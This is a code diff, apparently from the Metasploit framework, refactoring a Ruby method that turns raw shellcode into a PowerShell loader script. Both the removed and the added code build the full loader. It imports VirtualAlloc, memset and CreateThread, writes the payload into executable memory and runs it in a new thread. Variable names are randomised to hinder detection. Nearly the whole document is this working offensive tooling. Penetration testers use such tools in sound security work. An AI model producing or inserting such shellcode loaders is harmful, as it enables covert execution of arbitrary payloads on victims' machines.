@@ -1040,7 +1040,7 @@ End Sub
 		psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
 		psh << "$#{var_temp} = [#{var_kernel32}.func]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.func+Time]::Infinite)\r\n"
 	end
-
+	
 	def self.to_win32pe_psh(framework, code, opts={})
 
 		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1049,39 +1049,35 @@ End Sub
 		var_size = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_rwx = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_iter = Rex::Text.rand_text_alpha(rand(8)+8)
-		psh_payload = ''
-
-		# Set up the payload string
-		payload = code.unpack('C*')
-		psh_payload << "[Byte[]]$#{var_payload} = 0x#{payload[0].to_s(16)}"
-		lines = []
-		1.upto(payload.length-1) do |byte|
-			if(byte % 10 == 0)
-				lines.push "\r\n$#{var_payload} += 0x#{payload[byte].to_s(16)}"
-			else
-				lines.push ",0x#{payload[byte].to_s(16)}"
-			end
-		end
-		psh_payload << lines.join("") + "\r\n"
+		code = code.unpack("C*")
 
 		# Add wrapper script
-		psh = %{
-$#{var_code} = @"
-[DllImport("kernel32.dll")]
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-[DllImport("kernel32.dll")]
-public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-[DllImport("msvcrt.dll")]
-public static extern IntPtr memset(IntPtr dest, uint src, uint count);
-"@
-$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name "Win32" -namespace Win32Functions -passthru
-#{psh_payload}
-$#{var_size} = 0x1000
-if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}
-$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)
-for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}
-$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)
-} + "\r\n"
+		psh = "$#{var_code} = @\"\r\n"
+		psh << "[DllImport(\"kernel32.dll\")]\r\n"
+		psh << "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+		psh << "[DllImport(\"kernel32.dll\")]\r\n"
+		psh << "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+		psh << "[DllImport(\"msvcrt.dll\")]\r\n"
+		psh << "public static extern IntPtr memset(IntPtr dest, uint src, uint count);\r\n"
+		psh << "\"@\r\n"
+		psh << "$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name \"Win32\" -namespace Win32Functions -passthru\r\n"
+		# Set up the payload string
+		psh << "[Byte[]]$#{var_payload} = 0x#{code[0].to_s(16)}"
+		lines = []
+		1.upto(code.length-1) do |byte|
+			if(byte % 10 == 0)
+				lines.push "\r\n$#{var_payload} += 0x#{code[byte].to_s(16)}"
+			else
+				lines.push ",0x#{code[byte].to_s(16)}"
+			end
+		end
+		psh << lines.join("") + "\r\n\r\n"
+		psh << "$#{var_size} = 0x1000\r\n"
+		psh << "if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}\r\n"
+		psh << "$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)\r\n"
+		psh << "for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}\r\n"
+		psh << "$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)\r\n"
+
 
 	end
 
